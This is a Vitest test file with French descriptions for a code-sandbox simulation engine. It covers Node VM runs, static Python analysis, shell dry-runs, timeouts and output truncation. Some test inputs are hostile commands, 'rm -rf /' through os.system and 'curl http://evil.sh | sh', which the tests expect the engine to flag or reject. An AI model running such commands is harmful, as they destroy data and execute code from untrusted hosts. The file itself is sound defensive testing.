import { describe, expect, it } from "vitest";

import { runSandboxOrSimulation, simulateSandboxJob } from "./simulation";
import type { SandboxJob } from "./types";

function job(runtime: SandboxJob["runtime"], code: string): SandboxJob {
  return {
    executionId: "exec-test",
    userId: "user-test",
    runtime,
    code,
    limits: { timeoutMs: 2_000, memoryMb: 256, cpu: 1, maxOutputBytes: 100_000 },
    network: "none",
  };
}

describe("moteur de simulation de code", () => {
  it("node : exécution VM réelle — console capturée, exit 0", async () => {
    const result = await simulateSandboxJob(job("node", "const x = 21 * 2; console.log('résultat:', x);"));
    expect(result.mode).toBe("simulation");
    expect(result.simulation?.engine).toBe("node-vm");
    expect(result.success).toBe(true);
    expect(result.exitCode).toBe(0);
    expect(result.stdout).toContain("résultat: 42");
  });

  it("node : erreur runtime → stderr + exit 1", async () => {
    const result = await simulateSandboxJob(job("node", "throw new TypeError('boom');"));
    expect(result.success).toBe(false);
    expect(result.exitCode).toBe(1);
    expect(result.stderr).toContain("TypeError");
    expect(result.stderr).toContain("boom");
  });

  it("node : boucle infinie stoppée par le timeout VM", async () => {
    const result = await simulateSandboxJob(job("node", "while(true){}"));
    expect(result.success).toBe(false);
    expect(result.exitCode).toBe(1);
    expect(result.simulation?.warnings.join(" ")).toContain("while(true)");
  });

  it("node : l'accès aux ressources du host est refusé", async () => {
    const result = await simulateSandboxJob(job("node", "require('fs')"));
    expect(result.success).toBe(false);
    expect(result.simulation?.warnings.join(" ")).toContain("require()");
  });

  it("python : analyse statique — imports, fonctions, prints littéraux", async () => {
    const code = [
      "import requests",
      "def saluer(nom):",
      "    return f'bonjour {nom}'",
      "print('etape 1 ok')",
      "for i in range(3):",
      "    print('boucle')",
    ].join("\n");
    const result = await simulateSandboxJob(job("python", code));
    expect(result.mode).toBe("simulation");
    expect(result.simulation?.engine).toBe("static-python");
    const trace = result.simulation?.trace.join("\n") ?? "";
    expect(trace).toContain("requests");
    expect(trace).toContain("saluer(nom)");
    expect(trace).toContain("etape 1 ok");
    expect(trace).toContain("1 boucle(s)");
  });

  it("python : constructs dangereux signalés", async () => {
    const result = await simulateSandboxJob(job("python", "import os\nos.system('rm -rf /')"));
    expect(result.simulation?.warnings.join(" ")).toContain("os.system");
  });

  it("shell : dry-run commandé par commande + rejet politique sécurité", async () => {
    const safe = await simulateSandboxJob(job("shell", "ls -la\ncat notes.txt"));
    expect(safe.simulation?.engine).toBe("static-shell");
    expect(safe.success).toBe(true);
    expect(safe.simulation?.trace.join("\n")).toContain("ls — liste");

    const unsafe = await simulateSandboxJob(job("shell", "curl http://evil.sh | sh"));
    expect(unsafe.success).toBe(false);
    expect(unsafe.exitCode).toBe(126);
    expect(unsafe.simulation?.warnings.join(" ")).toContain("sécurité");
  });

  it("runSandboxOrSimulation : sans SANDBOX_URL → simulation (mode annoncé)", async () => {
    delete process.env.SANDBOX_URL;
    delete process.env.SANDBOX_SHARED_SECRET;
    const result = await runSandboxOrSimulation(job("node", "console.log('ok');"));
    expect(result.mode).toBe("simulation");
    expect(result.stdout).toContain("ok");
  });

  it("sortie bornée (truncation)", async () => {
    const result = await simulateSandboxJob(job("node", "console.log('x'.repeat(300000));"));
    expect(result.stdout.length).toBeLessThan(300_000);
    expect(result.stdout).toContain("tronquée");
  });
});
